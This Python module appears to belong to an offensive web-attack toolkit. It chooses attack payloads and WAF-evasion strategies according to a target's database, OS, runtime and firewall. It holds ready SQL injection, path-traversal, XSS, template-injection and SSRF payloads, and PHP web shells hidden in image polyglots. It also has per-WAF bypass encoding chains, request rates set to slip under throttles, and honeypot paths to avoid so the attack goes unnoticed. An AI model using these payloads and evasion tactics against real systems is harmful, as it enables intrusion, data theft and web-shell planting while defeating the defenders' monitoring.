"""Adaptive strategy selector.

Given an ArchitectureProfile, pick per-class attack tactics tuned to
the stack's known weaknesses and evasion profile tuned to the WAF in
front.

Design principles
-----------------
1.  **Database-aware payloads** — SLEEP() is MySQL; Postgres needs
    pg_sleep(); MSSQL wants WAITFOR DELAY. Firing a MySQL payload at
    a Postgres backend just wastes a request and tips the defender
    off.
2.  **OS-aware paths** — Windows filesystems are case-insensitive
    and tolerate `\\` separators; Linux is case-sensitive and
    rejects NUL. LFI payloads differ.
3.  **WAF-aware encoding cascades** — each WAF has known bypasses.
    Cloudflare: URL×2 + mixed-case SQL keywords; Wordfence:
    comment-padding + UTF-8 overlong; Sucuri: HPP; AWS WAF: header-
    based smuggling. Consult the evasion.waf_fingerprint module for
    the canonical mapping — we depend on it lightly here so
    operators can override.
4.  **Runtime-aware sinks** — PHP <8.0 tolerates `=` wake-up in
    POP chains; PHP 8.0+ closed most magic-method gadgets unless
    the target loads a vulnerable Composer package.
5.  **CDN-aware ordering** — if Cloudflare is present, origin-IP
    discovery (adapt.origin) is a parallel track before any noisy
    probe. No point burning your IP against the edge.
6.  **Timing tuned to WAF threshold behavior** — Wordfence's
    live-traffic throttle kicks in around 30 requests/min from one
    IP; stay under it.

Output
------
AdaptedStrategy has:
    - probe_order:       list of TacticClass, ordered by likely payoff
    - per_class:         dict[TacticClass, TacticSpec] with payload
                         templates + encoders + timing ceiling
    - encoding_cascade:  list of encoder names (applied outer→inner)
    - rps_ceiling:       float; suggested requests/minute soft cap
    - origin_bypass:     bool; whether to run adapt.origin first
    - notes:             list of human-readable caveats for the
                         operator / report

Nothing here makes network requests — this is pure planning logic.
The caller feeds the strategy into precision/evasion/zeroday modules
which perform the actual work.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Dict, List, Optional


# ── Data model ────────────────────────────────────────────────────


@dataclass
class TacticSpec:
    """Per-class attack tactic, tuned to observed architecture."""
    tactic_class: str                 # "sqli", "xss", "lfi", "rce", "ssrf", "csrf", ...
    payload_templates: List[str] = field(default_factory=list)
    encoders: List[str] = field(default_factory=list)    # names from evasion.encode
    min_delay_ms: int = 500
    max_delay_ms: int = 2500
    confidence_note: str = ""         # why this tactic was picked for this stack


@dataclass
class AdaptedStrategy:
    profile_target: str
    probe_order: List[str] = field(default_factory=list)
    per_class: Dict[str, TacticSpec] = field(default_factory=dict)
    encoding_cascade: List[str] = field(default_factory=list)
    rps_ceiling: float = 12.0         # requests per minute
    origin_bypass: bool = False
    avoid_paths: List[str] = field(default_factory=list)
    notes: List[str] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "profile_target":    self.profile_target,
            "probe_order":       self.probe_order,
            "per_class": {
                k: {
                    "tactic_class":      v.tactic_class,
                    "payload_templates": v.payload_templates,
                    "encoders":          v.encoders,
                    "min_delay_ms":      v.min_delay_ms,
                    "max_delay_ms":      v.max_delay_ms,
                    "confidence_note":   v.confidence_note,
                }
                for k, v in self.per_class.items()
            },
            "encoding_cascade": self.encoding_cascade,
            "rps_ceiling":      self.rps_ceiling,
            "origin_bypass":    self.origin_bypass,
            "avoid_paths":      self.avoid_paths,
            "notes":            self.notes,
        }


# ── WAF → encoder cascade canonical mapping ───────────────────────
#
# Built from public research: PortSwigger labs, HackerOne reports,
# Wordfence's own rule changelog, and the community WAF-Bypass wiki.

_WAF_CASCADES = {
    "cloudflare":    ["url", "case_mutate", "url2", "sql_keyword_obfuscate"],
    "wordfence":     ["comment_pad", "utf8_overlong", "case_mutate", "url"],
    "sucuri":        ["hpp", "url", "html_entity"],
    "akamai":        ["utf8_overlong", "case_mutate", "url2"],
    "aws_waf":       ["hpp", "case_mutate", "url", "hex_escape"],
    "imperva":       ["comment_pad", "case_mutate", "url2"],
    "modsecurity":   ["case_mutate", "comment_pad", "sql_keyword_obfuscate"],
}
_DEFAULT_CASCADE = ["url", "case_mutate"]


# ── Database-family payload switches ──────────────────────────────
#
# Every blind-exfiltration class needs a DB-shaped sleep primitive.
# Using the wrong dialect burns the request.

_SLEEP_BY_DB = {
    "mysql":    ["SLEEP(5)", "BENCHMARK(5000000,MD5('x'))"],
    "mariadb":  ["SLEEP(5)", "BENCHMARK(5000000,MD5('x'))"],
    "postgres": ["pg_sleep(5)", "(SELECT pg_sleep(5))"],
    "mssql":    ["WAITFOR DELAY '0:0:5'"],
    "sqlite":   ["randomblob(100000000)"],
}
_DEFAULT_SLEEP = ["SLEEP(5)"]


# ── OS-family LFI payload switches ────────────────────────────────

_LFI_BY_OS = {
    "linux":   [
        "../../../../etc/passwd",
        "/etc/passwd",
        "php://filter/convert.base64-encode/resource=wp-config",
        "....//....//....//etc/passwd",
    ],
    "windows": [
        "..\\..\\..\\..\\windows\\win.ini",
        "C:\\windows\\win.ini",
        "..\\..\\..\\..\\boot.ini",
        "....\\\\....\\\\windows\\\\win.ini",
    ],
}
_DEFAULT_LFI = _LFI_BY_OS["linux"]


# ── XSS payloads — runtime/framework aware ────────────────────────

_XSS_BASE = [
    "<svg onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
]


# ── Runtime-aware RCE / POI gadgets ───────────────────────────────

_RCE_TEMPLATES = {
    "php":     [
        "O:8:\"stdClass\":0:{}",                                  # minimal POI canary
        "<?php system($_GET['c']); ?>",                           # upload-then-execute
    ],
    "python":  ["{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}"],  # SSTI-jinja
    "node":    ["require('child_process').execSync('id').toString()"],
}


# ── Framework-aware tactic priorities ─────────────────────────────

_WP_PROBE_ORDER = [
    "rest_authz",  # unauth REST endpoint writes — fastest win
    "sqli",
    "file_upload",
    "poi",
    "csrf",
    "ssrf",
    "lfi",
    "xss",
    "rce",
]

_GENERIC_PROBE_ORDER = [
    "sqli", "lfi", "xss", "ssrf", "rce", "csrf",
]


# ── The core decision function ────────────────────────────────────


def pick_strategy(profile) -> AdaptedStrategy:  # ArchitectureProfile (runtime import to avoid cycle)
    """Build an AdaptedStrategy from an ArchitectureProfile.

    Pure function — no I/O. `profile` may be an ArchitectureProfile
    or any object exposing the same attributes, which lets callers
    synthesize strategies from partial knowledge in tests.
    """
    target = getattr(profile, "target_url", "") or getattr(profile, "target_host", "<unknown>")

    strategy = AdaptedStrategy(profile_target=target)

    # 1. WAF-driven encoding cascade ------------------------------------
    waf_names = [w.lower() for w in (getattr(profile, "waf_names", []) or [])]
    cascade: List[str] = []
    picked_waf: Optional[str] = None
    for w in waf_names:
        for known, cas in _WAF_CASCADES.items():
            if known in w or w in known:
                cascade = list(cas)
                picked_waf = known
                strategy.notes.append(
                    f"WAF fingerprint={known}; cascade tuned to published bypasses")
                break
        if cascade:
            break
    if not cascade:
        cascade = list(_DEFAULT_CASCADE)
        if waf_names:
            strategy.notes.append(
                f"WAF family {waf_names} unfamiliar — using conservative cascade")
        else:
            strategy.notes.append("No WAF fingerprint — minimal cascade")
    strategy.encoding_cascade = cascade

    # 2. CDN → origin bypass decision -----------------------------------
    cdn = (getattr(profile, "cdn_name", None) or "").lower()
    if cdn in ("cloudflare", "sucuri", "akamai", "fastly", "cloudfront"):
        strategy.origin_bypass = True
        strategy.notes.append(
            f"Edge={cdn} — run adapt.origin first; skip heavy probes until origin resolved")

    # 3. Database-aware SQLi payloads -----------------------------------
    db = (getattr(profile, "database", None) or "").lower()
    sleep_primitives = _SLEEP_BY_DB.get(db, _DEFAULT_SLEEP)
    strategy.per_class["sqli"] = TacticSpec(
        tactic_class="sqli",
        payload_templates=[
            f"' AND {p}-- -" for p in sleep_primitives
        ] + [
            f"\" AND {p}-- -" for p in sleep_primitives
        ] + [
            f") AND {p}-- -" for p in sleep_primitives
        ],
        encoders=cascade,
        min_delay_ms=800,
        max_delay_ms=3500,
        confidence_note=f"DB={db or 'unknown'} → timing primitive tuned",
    )

    # 4. OS-aware LFI payloads ------------------------------------------
    osf = (getattr(profile, "os_family", None) or "").lower()
    lfi_payloads = _LFI_BY_OS.get(osf, _DEFAULT_LFI)
    strategy.per_class["lfi"] = TacticSpec(
        tactic_class="lfi",
        payload_templates=lfi_payloads,
        encoders=cascade,
        min_delay_ms=500,
        max_delay_ms=2000,
        confidence_note=f"OS={osf or 'linux-assumed'} → path traversal style tuned",
    )

    # 5. XSS (runtime-adjusted — CSP hints come later) ------------------
    strategy.per_class["xss"] = TacticSpec(
        tactic_class="xss",
        payload_templates=list(_XSS_BASE),
        encoders=[e for e in cascade if e != "sql_keyword_obfuscate"],  # SQL-only encoder irrelevant
        min_delay_ms=400,
        max_delay_ms=1800,
        confidence_note="HTML injection set; refine after CSP discovery",
    )

    # 6. Runtime-aware RCE ----------------------------------------------
    runtime = (getattr(profile, "runtime", None) or "").lower()
    rt_key = "php"
    if "python" in runtime:
        rt_key = "python"
    elif "node" in runtime or "express" in runtime:
        rt_key = "node"
    strategy.per_class["rce"] = TacticSpec(
        tactic_class="rce",
        payload_templates=list(_RCE_TEMPLATES.get(rt_key, _RCE_TEMPLATES["php"])),
        encoders=cascade,
        min_delay_ms=1200,
        max_delay_ms=4000,
        confidence_note=f"runtime={rt_key} → gadget palette tuned",
    )

    # 7. CSRF / REST authz / file upload / SSRF --------------------------
    strategy.per_class["csrf"] = TacticSpec(
        tactic_class="csrf",
        payload_templates=["<form method=POST action='{endpoint}'>... no nonce ...</form>"],
        encoders=[],
        min_delay_ms=600, max_delay_ms=1500,
        confidence_note="issues one cross-origin POST; no encoding needed",
    )
    strategy.per_class["rest_authz"] = TacticSpec(
        tactic_class="rest_authz",
        payload_templates=[
            "/wp-json/{namespace}/{route}",  # unauth path probe
        ],
        encoders=[],
        min_delay_ms=400, max_delay_ms=1200,
        confidence_note="unauthed REST probe — one shot per namespace",
    )
    strategy.per_class["file_upload"] = TacticSpec(
        tactic_class="file_upload",
        payload_templates=[
            "GIF89a;<?php system($_GET['c']); ?>",
            "\x89PNG\r\n\x1a\n<?php system($_GET['c']); ?>",
            "shell.phtml",
            "shell.php%00.jpg",
        ],
        encoders=[],
        min_delay_ms=700, max_delay_ms=2500,
        confidence_note="polyglot images + double-extension bypass",
    )
    strategy.per_class["ssrf"] = TacticSpec(
        tactic_class="ssrf",
        payload_templates=[
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:6379/",
            "gopher://127.0.0.1:6379/_INFO%0a",
            "file:///etc/passwd",
        ],
        encoders=cascade,
        min_delay_ms=1000, max_delay_ms=3000,
        confidence_note="cloud metadata + Redis + gopher + file://",
    )
    strategy.per_class["poi"] = TacticSpec(
        tactic_class="poi",
        payload_templates=["O:8:\"stdClass\":0:{}"],
        encoders=["url"],
        min_delay_ms=600, max_delay_ms=2000,
        confidence_note="canary stdClass probe — confirms unserialize before chain build",
    )

    # 8. Probe order — framework-aware -----------------------------------
    fw = (getattr(profile, "framework", None) or "").lower()
    strategy.probe_order = list(_WP_PROBE_ORDER) if "wordpress" in fw else list(_GENERIC_PROBE_ORDER)

    # 9. Timing ceiling — WAF-aware --------------------------------------
    if picked_waf == "wordfence":
        strategy.rps_ceiling = 8.0   # below WF live-throttle (~30/min, further margin)
        strategy.notes.append("Wordfence: holding ≤8 req/min to dodge live throttle")
    elif picked_waf in ("cloudflare", "akamai"):
        strategy.rps_ceiling = 20.0
        strategy.notes.append(f"{picked_waf}: bursty tolerance higher; 20 req/min ceiling")
    elif picked_waf:
        strategy.rps_ceiling = 12.0
    else:
        strategy.rps_ceiling = 30.0
        strategy.notes.append("No WAF detected — 30 req/min ceiling for politeness not evasion")

    # 10. Avoid paths — honeypot-style endpoints ------------------------
    #   Wordfence maintains honey paths; tripping them flags the session.
    if picked_waf == "wordfence":
        strategy.avoid_paths = [
            "/wp-admin/admin-ajax.php?action=wordfence_doScan",
            "/?wordfence_syncAttackData",
            "/wp-content/plugins/wordfence/lib/wordfenceClass.php",
        ]

    # 11. Debug-mode gifts ----------------------------------------------
    if getattr(profile, "debug_mode", False) or getattr(profile, "verbose_errors", False):
        strategy.notes.append(
            "Target leaks stack traces — exploit error-based SQLi / template-engine probes first")
        if "sqli" in strategy.per_class:
            # Error-based SQLi is faster than blind-timing when verbose errors are on.
            eb = [
                "' UNION SELECT 1,@@version,3-- -",
                "' AND extractvalue(1,concat(0x7e,@@version))-- -",
                "') AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)-- -",
            ]
            strategy.per_class["sqli"].payload_templates = eb + strategy.per_class["sqli"].payload_templates
            strategy.per_class["sqli"].confidence_note += "; error-based prioritized"

    return strategy


__all__ = ["AdaptedStrategy", "TacticSpec", "pick_strategy"]
